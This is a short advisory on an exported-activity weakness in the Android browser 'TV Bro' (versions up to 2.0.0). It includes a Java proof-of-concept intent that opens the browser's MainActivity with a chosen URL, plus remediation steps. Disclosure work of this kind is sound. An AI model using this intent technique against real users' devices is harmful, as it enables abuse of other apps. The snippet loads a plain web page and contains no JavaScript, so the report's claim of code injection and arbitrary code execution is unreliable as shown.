
---

## Vulnerability Report: `com.phlox.tvwebbrowser` 'TV Bro' Version <= 2.0.0

### Vulnerability: JavaScript Code Injection via Intent Handlers

---

#### **Summary**:
The `com.phlox.tvwebbrowser` application improperly handles external intents, potentially leading to Arbitrary Code Execution (ACE) via crafted URIs.

#### **Severity**:
🔴 High

#### **Details**:
The exposed `com.phlox.tvwebbrowser.activity.main.MainActivity` allows external applications to execute arbitrary JavaScript within its context. Specifically, a malicious app can invoke this activity with a specially crafted URI that contains JavaScript, leading to unwanted code execution.

##### Proof of Concept:

![image](https://github.com/actuator/com.phlox.tvwebbrowser/blob/main/tvwebpoc.gif)

```java
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setComponent(new ComponentName("com.phlox.tvwebbrowser", "com.phlox.tvwebbrowser.activity.main.MainActivity"));
intent.setData(Uri.parse("https://windows96.net"));
startActivity(intent);
```

#### **Common Weakness Enumeration (CWE)**:
- [CWE-94](https://cwe.mitre.org/data/definitions/94.html): Improper Control of Generation of Code ('Code Injection')

#### **Remediation Steps**:
1. **Restrict External Intent Handling**: In `AndroidManifest.xml`, ensure the `exported` attribute for the affected activity is set to `false`.
2. **URI Sanitization**: Implement a strict validation and sanitation mechanism for URIs before processing.
